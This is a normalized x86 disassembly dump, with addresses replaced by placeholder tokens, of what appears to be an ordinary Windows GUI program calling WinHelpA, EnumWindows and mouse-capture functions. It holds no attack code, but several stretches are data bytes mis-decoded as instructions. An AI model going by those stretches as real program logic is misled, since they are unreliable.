mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_440c60
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_440d7a
jmp sub_403ae4
sub_440dc4
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_440e4f
jmp sub_403ae4
sub_440e56
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440e88
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_440e94
mov [ eax + 0x210 ] edx
retn
sub_440ee5
jmp sub_403ae4
sub_440eec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440fb4
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_44cd54
sub_441008
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_44101d
mov eax [ eax + 0x238 ]
retn
sub_44101d
push 0x0
xor ecx ecx
mov edx 0x154
call sub_44a180
retn
sub_44135c
jmp sub_403ae4
sub_441363
pop ebx
mov esp ebp
pop ebp
retn
sub_441720
jmp sub_403ae4
sub_441727
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4418e5
jmp sub_403ae4
sub_4418ec
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4418f8
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_441adc
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_441ae8
mov eax [ r-xdata ]
retn
sub_441d19
jmp sub_403ae4
sub_441d28
retn
sub_441dde
jmp sub_403ae4
sub_441e88
mov eax [ r-xdata ]
retn
sub_441e90
xor eax eax
retn
sub_441eb4
retn
sub_441fcc
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44cd54
sub_442044
push ebx
mov ebx eax
mov eax ebx
call sub_45fd40
test eax eax
je r-xdata
mov eax ebx
call sub_44a508
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_442068
xor eax eax
retn
sub_44212f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x59cd173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_442148
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403564
sub_442239
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_442242
jmp sub_403ae4
j_sub_442239
jmp sub_442239
sub_442249
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44237c
mov al [ eax + 0x211 ]
retn
sub_4423b0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44cd54
sub_442590
call sub_44cd54
retn
sub_44260d
jmp sub_403ae4
sub_442614
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4429d7
jmp sub_403ae4
sub_4429de
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4429e8
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_4428a0
retn
sub_442a54
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_4428a0
retn
sub_442a6c
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_4428a0
retn
sub_442a80
push ebx
mov ebx eax
mov eax ebx
call sub_448bc0
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_442aa4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_442bdc
call sub_442ac4
retn
sub_442be4
call sub_442ac4
retn
sub_442c14
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_442c41
jmp sub_403ae4
sub_442c48
pop ebp
retn
sub_442c4c
sub [ rw-data ] 0x1
retn
sub_442da9
jmp sub_403ae4
sub_442db0
pop ebp
retn
sub_442db4
sub [ rw-data ] 0x1
retn
sub_442dbc
inc esi
dec eax
add dh dh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_443634
sub_442dcd
add eax 0xffffffe0
jmp sub_4433b4
sub_442dd5
add eax 0xffffffe0
jmp sub_44341c
sub_442ddd
add eax 0xffffffe0
jmp sub_443530
sub_442de5
add eax 0xffffffe0
jmp sub_4435a4
sub_442ded
add eax 0xffffffe0
jmp sub_443060
sub_442df5
add eax 0xffffffe0
jmp sub_443074
sub_442dfd
add eax 0xffffffe0
jmp sub_4430ec
sub_442e05
add eax 0xffffffe0
jmp sub_443190
sub_442e0d
add eax 0xffffffe0
jmp sub_443194
sub_442e15
add eax 0xffffffe0
jmp sub_44321c
sub_442e1d
add eax 0xffffffe0
jmp sub_443364
sub_442e25
add eax 0xffffffe0
jmp sub_443368
sub_442e2d
add eax 0xffffffe0
jmp sub_443384
sub_442e3f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405bd8
sub_442e49
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405bec
sub_44301d
jmp sub_403ae4
sub_443024
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443060
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4041b8
pop ebx
retn
sub_4430db
jmp sub_403ae4
sub_4430e2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443174
jmp sub_403ae4
sub_44317b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443190
mov al 0x1
retn
sub_44320f
jmp sub_403ae4
sub_443216
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443314
jmp sub_403ae4
sub_44331b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443364
mov [ eax + 0xc ] edx
retn
sub_443368
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_44340c
jmp sub_403ae4
sub_443413
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443512
jmp sub_403ae4
sub_443519
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443592
jmp sub_403ae4
sub_443599
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443624
jmp sub_403ae4
sub_44362b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44371f
jmp sub_403ae4
sub_443726
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4437e8
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_443734
call EnumWindows
retn
sub_44387a
jmp sub_403ae4
sub_443881
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44388c
xor eax eax
retn
sub_443985
jmp sub_403ae4
sub_44398c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443a76
jmp sub_403ae4
sub_443a7d
pop ebp
retn
sub_443ad2
jmp sub_403ae4
sub_443ad9
pop ebp
retn
sub_444c68
jmp r-xdata
sub_444c6a
0xe8ffe9ff 0xe7ff
sub_444c71
jmp esi
sub_4452e6
inc esp
add al dh
int3
sub_4452ea
inc esp
add [ eax + 0x500044cb ] ch

sub_4452f2
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_4457e2
inc esp
add al dh
int3
sub_4457e6
inc esp
add [ eax + 0x500044cb ] ch

sub_4457ee
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_44593e
inc esp
add al dh
int3
sub_445942
inc esp
add [ eax + 0x500044cb ] ch

sub_44594a
inc esp
add al cl
test [ eax + eax - 0x3c ] 0x9c004514
or [ ebp ] eax
inc esp
hlt
sub_445a21
add eax 0xffffff8c
jmp sub_451ddc
sub_445a29
add eax 0xffffff8c
jmp sub_451de0
sub_445a31
add eax 0xffffff8c
jmp sub_451ecc
sub_445a39
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_445a46
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_445a53
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_445a60
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_445a6d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_445a7a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_445a87
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_445a94
add eax 0xffffff8c
jmp sub_45353c
sub_445aa6
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405bd8
sub_445ab0
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405bec
sub_445cde
inc esp
add al dh
int3
sub_445ce2
inc esp
add [ eax + 0x500044cb ] ch

sub_445cea
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_445d6c
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44607f
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4181c4
retn
sub_44609c
push 0x15
mov ecx rw-data
call sub_418184
retn
sub_446134
call GetCapture
call sub_445e6c
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_446398
push ebx
push eax
push sub_44651c
call sub_4222d0
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_4463b0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4463e0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_422384
pop ebx
retn
sub_4464be
jmp sub_403830
sub_4464f0
xor eax eax
retn
sub_4464f4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44650c
retn
sub_446510
mov eax [ rw-data ]
retn
sub_446518
retn
sub_446546
jmp sub_403830
sub_44654b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446568
call sub_4035a8
xor eax eax
mov [ rw-data ] eax
retn
sub_446578
call sub_4035a4
xor eax eax
mov [ rw-data ] eax
retn
sub_446588
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_446638
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_446650
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44669c
retn
sub_446854
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403564
pop esi
retn
sub_446868
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403564
pop esi
retn
sub_44687c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_446888
mov eax 0x4
retn
sub_446890
retn
sub_447481
jmp sub_403830
sub_44776e
jmp sub_403ae4
sub_4477e0
jmp sub_403ae4
sub_4477ec
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_447514
sub_44796b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425064
retn
sub_447981
jmp sub_403ae4
sub_4479a8
jmp sub_403ae4
sub_447a2a
jmp sub_403ae4
sub_447a52
jmp sub_403ae4
sub_447a59
mov esp ebp
pop ebp
retn
sub_447b11
jmp sub_403ae4
sub_447b68
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_447b34
mov [ ebx + 0x58 ] esi
sub_447cbc
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_447cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_447db9
jmp sub_403ae4
sub_447dc0
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447e43
jmp sub_403ae4
sub_447e4a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_448218
xor eax eax
retn
sub_44821c
mov al [ eax + 0x58 ]
retn
sub_448220
xor eax eax
retn
sub_448224
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44822c
mov eax [ eax + 0x30 ]
retn
sub_4482d0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44837c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_448394
mov [ eax + 0x5d ] dl
retn
sub_448398
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44bfb8
sub_4483a8
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44888b
jmp sub_403ae4
sub_448892
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4488f4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_4489a0
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_448abd
jmp sub_403ae4
sub_448ac4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448bc0
push eax
xor ecx ecx
mov edx 0xb037
call sub_44a180
retn
sub_448d81
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403564
sub_448e32
jmp sub_403ae4
sub_448e39
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448f10
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44a180
sub_448f28
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44a180
retn
sub_448f38
push edx
mov edx 0xd
call sub_44a180
retn
sub_448f44
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_448f58
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_449039
jmp sub_403ae4
sub_449040
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449048
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44a180
sub_4490b8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4490cc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4490d8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4490e0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44a180
sub_449104
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44a180
sub_449128
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44a180
sub_449170
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_449178
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44a180
sub_44919c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44a180
sub_4491c0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44a180
sub_4491dc
push ebx
mov ebx eax
call sub_446134
cmp ebx eax
sete al
pop ebx
retn
sub_449214
push esi
mov dl 0x1
mov si 0xffce
call sub_403564
pop esi
retn
sub_44935e
jmp sub_403ae4
sub_449365
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449488
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4493fc
retn
sub_4494dc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4494f0
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4495d5
jmp sub_403ae4
sub_4495f4
xor eax eax
retn
sub_4495f8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_449610
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_449628
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_449640
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44965c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_449674
retn
sub_449738
retn
sub_44973c
cmp eax [ rw-data ]
sete al
retn
sub_4497b0
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4498cc
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403564
pop esi
pop ebp
retn 0x4
sub_44990c
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_449ba3
jmp sub_403ae4
sub_449baa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449bb4
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403564
pop esi
retn
sub_449bc8
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403564
pop esi
retn
sub_449e97
jmp sub_403ae4
sub_449f40
push esi
mov si 0xffee
call sub_403564
pop esi
retn
sub_449f4c
mov al 0x1
retn
sub_44a224
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4485e0
retn
sub_44a248
retn
sub_44a461
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c394
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44a47c
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e84c
retn
sub_44a574
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44ab8c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ab94
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ab9c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ac54
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44ac74
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_449104
mov [ ebx + 0x9a ] 0x1
sub_44accc
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_4490a8
mov [ ebx + 0x56 ] 0x1
sub_44acf0
mov [ edx + 0xc ] 0x1
retn
sub_44acf8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44a180
sub_44ad10
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44a180
sub_44ad28
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44af8e
jmp sub_403ae4
sub_44af95
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44afc0
mov eax [ r-xdata ]
retn
sub_44b15c
jmp sub_403ae4
sub_44b163
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b284
mov eax [ eax + 0xb8 ]
retn
sub_44b2ec
push ebx
mov ebx eax
mov eax ebx
call sub_449610
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44b308
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44b4a0
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44b4d0
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44b4d8
call sub_44804c
retn
sub_44b5d8
jmp sub_403ae4
sub_44b798
jmp sub_403ae4
sub_44b7e8
jmp sub_403ae4
sub_44b820
retn
sub_44baa9
jmp sub_403ae4
sub_44bc31
jmp sub_403ae4
sub_44bf93
jmp sub_403ae4
sub_44c03f
jmp sub_403ae4
sub_44c04c
inc [ eax + 0x160 ]
retn
sub_44c054
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44c074
sub_44c074
xor edx edx
call sub_44bfb8
retn
sub_44c141
jmp sub_403ae4
sub_44c148
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c237
jmp sub_403ae4
sub_44c75e
jmp sub_403ae4
sub_44c765
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c92d
jmp sub_403ae4
sub_44c934
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ca08
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
j_sub_403ae4#2
jmp sub_403ae4
sub_44cbfc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44ccec
xor eax eax
retn
sub_44cd54
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44a180
j_sub_403830#9
jmp sub_403830
sub_44cfb7
jmp sub_403ae4
sub_44cfbe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403830#8
jmp sub_403830
sub_44cfcd
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d588
jmp sub_403ae4
sub_44d58f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d598
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44da96
jmp sub_403ae4
sub_44dae8
push ebx
mov ebx eax
call sub_42382c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44a180
pop ebx
retn
sub_44db04
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44a180
retn
sub_44db18
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44a180
retn
sub_44db28
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44a180
retn
sub_44ddd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fac4
pop esi
retn
sub_44dee8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44df38
pop esi
retn
sub_44defc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44e024
pop esi
retn
sub_44df10
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44df24
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44e017
jmp sub_403ae4
sub_44e01e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e0ae
jmp sub_403ae4
sub_44e0b5
pop ebx
pop ecx
pop ebp
retn
sub_44e0bc
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44e0cc
retn
sub_44e0d0
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44e0f0
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44e250
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44e320
retn
sub_44e438
jmp sub_403ae4
sub_44e43f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e50a
jmp sub_403ae4
sub_44e534
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44e5c6
jmp sub_403ae4
sub_44e798
push ebx
